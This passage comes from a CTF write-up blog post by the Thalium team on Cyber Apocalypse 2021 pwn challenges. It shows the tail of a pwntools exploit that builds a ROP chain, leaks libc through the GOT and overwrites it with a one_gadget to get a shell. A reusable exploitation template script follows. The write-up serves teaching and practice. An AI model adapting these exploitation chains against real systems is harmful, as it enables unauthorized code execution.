+</span></span><span style=display:flex><span>       <span style=color:#ae81ff>36</span>: p32(<span style=color:#ae81ff>0x8</span>), <span style=color:#ae81ff>40</span>: p64(elf<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#39;alarm&#39;</span>]),
+</span></span><span style=display:flex><span>   }, length<span style=color:#f92672>=</span><span style=color:#ae81ff>72</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   <span style=color:#75715e># 0x0000000000400b53 : pop rdi ; ret</span>
+</span></span><span style=display:flex><span>   gadget_pop_rdi       <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x400b53</span>
+</span></span><span style=display:flex><span>   <span style=color:#75715e># 0x0000000000400b51 : pop rsi ; pop r15 ; ret</span>
+</span></span><span style=display:flex><span>   gadget_pop_rsi_r15   <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x400b51</span>
+</span></span><span style=display:flex><span>   target_addr          <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x602020</span>
+</span></span><span style=display:flex><span>   
+</span></span><span style=display:flex><span>   ropchain <span style=color:#f92672>+=</span> p64(gadget_pop_rdi) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>   
+</span></span><span style=display:flex><span>   ropchain <span style=color:#f92672>+=</span> p64(gadget_pop_rsi_r15) <span style=color:#f92672>+</span> p64(target_addr) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>   ropchain <span style=color:#f92672>+=</span> p64(elf<span style=color:#f92672>.</span>plt[<span style=color:#e6db74>&#39;read&#39;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   <span style=color:#75715e># libc_csu_init</span>
+</span></span><span style=display:flex><span>   <span style=color:#75715e># 0x0000000000400b4a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
+</span></span><span style=display:flex><span>   gadget_many_pop      <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x400b4a</span>
+</span></span><span style=display:flex><span>   <span style=color:#75715e>#0x0000000000400b30: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+8*rbx]</span>
+</span></span><span style=display:flex><span>   gadget_indirect_call <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x400b30</span>
+</span></span><span style=display:flex><span>   
+</span></span><span style=display:flex><span>   ropchain <span style=color:#f92672>+=</span> p64(gadget_many_pop) <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>*</span>p64(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>+</span>p64(target_addr)<span style=color:#f92672>+</span><span style=color:#ae81ff>3</span><span style=color:#f92672>*</span>p64(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>   ropchain <span style=color:#f92672>+=</span> p64(gadget_indirect_call)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   ropchain <span style=color:#f92672>+=</span> <span style=color:#ae81ff>64</span><span style=color:#f92672>*</span>p64(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   p<span style=color:#f92672>.</span>send(ropchain)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   <span style=color:#75715e># Read libc alarm address</span>
+</span></span><span style=display:flex><span>   data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>8</span>)
+</span></span><span style=display:flex><span>   <span style=color:#66d9ef>assert</span>(len(data) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x8</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   libc_base <span style=color:#f92672>=</span> unpack(<span style=color:#e6db74>&#39;Q&#39;</span>, data)[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;alarm&#39;</span>]
+</span></span><span style=display:flex><span>   one_gadget <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4f432</span>
+</span></span><span style=display:flex><span>   p<span style=color:#f92672>.</span>send(p64(one_gadget))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   p<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><p>We have a shell:</p><p><a href=/posts/img/Cyber_Apocalypse_2021-close_the_door_win.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-close_the_door_win.png alt=fig_close_the_door_win></a></p><h2 id=conclusion>Conclusion</h2><p>These pwn challenges were fun but not that complicated, at least a good start for beginners to practice linux exploitation.</p><p>The Thalium team would like to thank the organizers for this exciting and well-balanced CTF.</p><h2 id=appendix>Appendix</h2><h3 id=template-script-for-exploitation-based-on-pwntoolshttpsgithubcomgallopsledpwntools>Template script for exploitation based on <a href=https://github.com/Gallopsled/pwntools>pwntools</a></h3><p>Here is the script we used. If we ever improve it, we may publish it on our <a href=https://github.com/thalium/thalium_ctf>CTF repository on github</a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> gdb, context, log, ELF, remote, process, p64, u64
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> os <span style=color:#f92672>import</span> listdir, path
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Specify the default path of library (use ldd on a binary if needed)</span>
+</span></span><span style=display:flex><span>PATH_LIBS <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/usr/lib64/&#34;</span> 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>set_context32</span>():
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;i386&#34;</span>  <span style=color:#75715e># amd64</span>
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>bits <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>endian <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;little&#34;</span>
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>os <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;linux&#34;</span>
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;info&#34;</span>
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;gnome-terminal&#34;</span>, <span style=color:#e6db74>&#34;-x&#34;</span>, <span style=color:#e6db74>&#34;bash&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>set_context64</span>():
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;amd64&#34;</span>  <span style=color:#75715e># amd64</span>
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>bits <span style=color:#f92672>=</span> <span style=color:#ae81ff>64</span>
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>endian <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;little&#34;</span>
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>os <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;linux&#34;</span>
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;info&#34;</span>
+</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;gnome-terminal&#34;</span>, <span style=color:#e6db74>&#34;-x&#34;</span>, <span style=color:#e6db74>&#34;bash&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Mode</span>:
+</span></span><span style=display:flex><span>    DEBUG <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;-d&#34;</span>
+</span></span><span style=display:flex><span>    REMOTE <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;-r&#34;</span>
+</span></span><span style=display:flex><span>    LIBC <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;-libc&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>usage</span>():
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Usage in default mode: ./path_to_bin/bin&#34;</span>)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Usage in debug mode: -d ./path_to_bin/bin&#34;</span>)
+</span></span><span style=display:flex><span>    print(
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Usage with custom libc: -libc VERSION</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Libc must be in </span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>You can check https://github.com/niklasb/libc-database to find libc binaries.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>You can check https://github.com/skysider/pwndocker to find how to run with other custom libraries&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>%</span> PATH_LIBS
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    print(
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Usage in remote mode: -r host port ./path_to_bin/bin (*./path_to_libc/libc &lt;- optional)&#34;</span>
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    exit()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_PIE</span>(proc):
+</span></span><span style=display:flex><span>    memory_map <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/proc/</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>/maps&#34;</span><span style=color:#f92672>.</span>format(proc<span style=color:#f92672>.</span>pid), <span style=color:#e6db74>&#34;rb&#34;</span>)<span style=color:#f92672>.</span>readlines()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> memory_map:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>][<span style=color:#ae81ff>2</span>:]<span style=color:#f92672>.</span>encode() <span style=color:#f92672>in</span> line<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> int(line<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&#34;</span>)[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>add_bps</span>(r, bps, elf):
+</span></span><span style=display:flex><span>    script <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;continue</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    script <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> elf<span style=color:#f92672>.</span>pie:
+</span></span><span style=display:flex><span>        PIE <span style=color:#f92672>=</span> get_PIE(r)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        PIE <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> bps:
+</span></span><span style=display:flex><span>            script <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;b *0x</span><span style=color:#e6db74>%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (PIE <span style=color:#f92672>+</span> x)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> script
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>debug</span>(r, bps, elf):
+</span></span><span style=display:flex><span>    script <span style=color:#f92672>=</span> (
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;set verbose on</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>  <span style=color:#75715e># set debug-file-directory /home/user/libs/glibc-2.27/debug</span>
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    script <span style=color:#f92672>+=</span> add_bps(r, bps, elf)
+</span></span><span style=display:flex><span>    print(script)
+</span></span><span style=display:flex><span>    gdb<span style=color:#f92672>.</span>attach(r, gdbscript<span style=color:#f92672>=</span>script)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>myExit</span>(msg):
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>warning(msg)
+</span></span><span style=display:flex><span>    exit()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>:
+</span></span><span style=display:flex><span>        usage()
+</span></span><span style=display:flex><span>    binary <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        elf <span style=color:#f92672>=</span> ELF(binary)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>        myExit(<span style=color:#e6db74>&#34;Problem with binary path &#34;</span> <span style=color:#f92672>+</span> binary)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ldPath <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>    libc <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>    libcPath <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>    DEBUG <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>    REMOTE <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    env <span style=color:#f92672>=</span> {}
+</span></span><span style=display:flex><span>    i <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> i <span style=color:#f92672>&lt;</span> len(sys<span style=color:#f92672>.</span>argv):
+</span></span><span style=display:flex><span>        opt <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[i]
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> opt <span style=color:#f92672>==</span> Mode<span style=color:#f92672>.</span>DEBUG:
+</span></span><span style=display:flex><span>            log<span style=color:#f92672>.</span>debug(<span style=color:#e6db74>&#34;Enable gdb mode&#34;</span>)
+</span></span><span style=display:flex><span>            DEBUG <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>            i <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> opt <span style=color:#f92672>==</span> Mode<span style=color:#f92672>.</span>REMOTE:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>                host <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>                port <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>]
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>                myExit(<span style=color:#e6db74>&#34;Problem with -r HOST PORT&#34;</span>)
+</span></span><span style=display:flex><span>            log<span style=color:#f92672>.</span>debug(<span style=color:#e6db74>&#34;Enable remote connection to &#34;</span>, host, port)
+</span></span><span style=display:flex><span>            REMOTE <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>            i <span style=color:#f92672>+=</span> <span style=color:#ae81ff>3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> opt <span style=color:#f92672>==</span> Mode<span style=color:#f92672>.</span>LIBC:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>                libcVersion <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>                myExit(<span style=color:#e6db74>&#34;Problem with -l PathToLibC&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            log<span style=color:#f92672>.</span>debug(<span style=color:#e6db74>&#34;Set Library version to&#34;</span>, libcVersion)
+</span></span><span style=display:flex><span>            <span style=color:#75715e># PATH_CUSTOM_GLIBC = PATH_GLIBC % libcVersion</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> file <span style=color:#f92672>in</span> listdir(PATH_LIBS):
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> file<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;ld&#34;</span>) <span style=color:#f92672>and</span> libcVersion <span style=color:#f92672>in</span> file:
+</span></span><span style=display:flex><span>                    ldPath <span style=color:#f92672>=</span> path<span style=color:#f92672>.</span>join(PATH_LIBS, file)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> file<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;libc&#34;</span>) <span style=color:#f92672>and</span> libcVersion <span style=color:#f92672>in</span> file:
+</span></span><span style=display:flex><span>                    libcPath <span style=color:#f92672>=</span> path<span style=color:#f92672>.</span>join(PATH_LIBS, file)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#75715e># libcPath = &#34;/lib/x86_64-linux-gnu/libc-2.27.so&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            env <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;LD_PRELOAD&#34;</span>: libcPath}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            libc <span style=color:#f92672>=</span> ELF(libcPath)
+</span></span><span style=display:flex><span>            i <span style=color:#f92672>+=</span> <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            myExit(<span style=color:#e6db74>&#34;Unknown option only -d -l -ld -r&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> libc:
+</span></span><span style=display:flex><span>        libc <span style=color:#f92672>=</span> elf<span style=color:#f92672>.</span>libc
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> REMOTE:
+</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> remote(host, int(port))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ldPath <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> process(binary, env<span style=color:#f92672>=</span>env)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> process([ldPath, binary], env<span style=color:#f92672>=</span>env)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> DEBUG:
+</span></span><span style=display:flex><span>            <span style=color:#75715e># Example</span>
+</span></span><span style=display:flex><span>            <span style=color:#75715e># bp = [elf.sym[&#34;malloc&#34;]]</span>
+</span></span><span style=display:flex><span>            <span style=color:#75715e># bp = [&#34;malloc&#34;]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            debug(r, bp, elf)
+</span></span><span style=display:flex><span>    exploit(r, elf, libc)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(p, elf, libc):
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Filled this function</span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>interactive()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Select context 32 or 64 bits</span>
+</span></span><span style=display:flex><span>    set_context64()
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div></div><footer class=post-footer><div class=post-footer-data><div class=tags><div class=tag><a href=/tags/ctf>#CTF</a></div><div class=tag><a href=/tags/writeup>#Writeup</a></div><div class=tag><a href=/tags/cyberapocalypse2021>#CyberApocalypse2021</a></div></div><span class=date>2021-04-28
+<span class=author>by
+Jérémy Rubert & Anonymous from Thalium team</span></span></div></footer></article><footer><div class=social-links-footer><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>GitHub</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a><div class=social-link><a href=/index.xml target=_blank>RSS</a></div></div><div class=copyright>Copyright (c) 2020, all rights reserved.</div><div class=poweredby>Powered by <a href=https://gohugo.io/>Hugo</a>.</div></footer></div></body></html>
